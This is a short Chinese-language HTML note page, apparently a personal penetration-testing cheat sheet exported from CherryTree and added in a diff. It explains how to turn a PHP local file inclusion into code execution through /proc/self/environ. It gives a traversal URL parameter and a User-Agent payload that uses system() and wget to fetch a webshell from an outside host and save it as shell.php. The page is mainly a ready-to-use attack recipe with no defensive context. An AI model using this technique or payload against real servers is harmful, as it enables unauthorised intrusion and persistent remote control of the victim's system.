@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>environ文件</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>environ文件</h1><br/>利用条件：<br />1、php 以 cgi 方式运行，这样 environ 才会保持 UA 头。<br />2、environ 文件存储位置已知，且 environ 文件可读。<br />姿势：<br /><code>proc/self/environ</code> 中会保存 user-agent 头。如果在 user-agent 中插入 php 代码，则 php 代码会被写入到 environ 中。之后再包含它，即可。<br />?file=../../../../../../../proc/self/environ<br />选择 User-Agent 写代码如下：<br />&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;<br />然后提交请求。<br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
